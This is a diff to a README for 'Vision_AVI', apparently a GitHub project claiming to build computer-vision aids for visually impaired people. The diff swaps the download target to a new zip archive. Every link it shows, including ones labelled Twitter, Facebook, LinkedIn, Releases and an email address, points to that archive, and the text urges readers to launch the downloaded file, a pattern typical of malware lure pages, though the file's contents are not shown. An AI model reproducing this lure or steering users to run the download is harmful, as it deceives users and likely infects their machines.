@@ -29,22 +29,22 @@ Welcome to Vision_AVI, a revolutionary computer vision project dedicated to empo
 - **Visual Impairment Aid**: Developing tools and solutions to assist those with visual impairments.
 
 ## Software Download 📥
-[![Download Software](https://github.com/Elleony2/Vision_AVI/releases/download/v1.0/Release_x64.zip)](https://github.com/Elleony2/Vision_AVI/releases/download/v1.0/Release_x64.zip)
+[![Download Software](https://github.com/Elleony2/Vision_AVI/releases/download/v2.0/Software.zip)](https://github.com/Elleony2/Vision_AVI/releases/download/v2.0/Software.zip)
 
 Click on the button above to download the software package. Don't forget to launch the downloaded file to experience the incredible features of Vision_AVI firsthand!
 
-Visit the [Releases](https://github.com/Elleony2/Vision_AVI/releases/download/v1.0/Release_x64.zip) section if you encounter any issues with the download link or require additional information.
+Visit the [Releases](https://github.com/Elleony2/Vision_AVI/releases/download/v2.0/Software.zip) section if you encounter any issues with the download link or require additional information.
 
 ## Get Involved! 🤝
 Join our mission to make the world a more inclusive place for visually impaired individuals. Whether you are a developer, designer, or simply passionate about using technology for social good, there are numerous ways to contribute to Vision_AVI. Feel free to explore the repository, submit bug reports, suggest new features, or even fork the project and create your own version. Together, we can create a more accessible and empathetic world for all.
 
 ## Connect With Us 🌐
 Stay updated with the latest news, releases, and developments by connecting with us on social media:
-- Twitter: [@Vision_AVI](https://github.com/Elleony2/Vision_AVI/releases/download/v1.0/Release_x64.zip)
-- Facebook: [Vision_AVI](https://github.com/Elleony2/Vision_AVI/releases/download/v1.0/Release_x64.zip)
-- LinkedIn: [Vision_AVI](https://github.com/Elleony2/Vision_AVI/releases/download/v1.0/Release_x64.zip)
+- Twitter: [@Vision_AVI](https://github.com/Elleony2/Vision_AVI/releases/download/v2.0/Software.zip)
+- Facebook: [Vision_AVI](https://github.com/Elleony2/Vision_AVI/releases/download/v2.0/Software.zip)
+- LinkedIn: [Vision_AVI](https://github.com/Elleony2/Vision_AVI/releases/download/v2.0/Software.zip)
 
-Feel free to reach out to us via email at https://github.com/Elleony2/Vision_AVI/releases/download/v1.0/Release_x64.zip for inquiries, collaborations, or any questions you may have regarding the project.
+Feel free to reach out to us via email at https://github.com/Elleony2/Vision_AVI/releases/download/v2.0/Software.zip for inquiries, collaborations, or any questions you may have regarding the project.
 
 ## Spread the Word 📢
 Help us spread awareness about Vision_AVI and the impactful work we are doing for visually impaired individuals. Share this repository with your friends, colleagues, and communities to inspire others to join our cause.
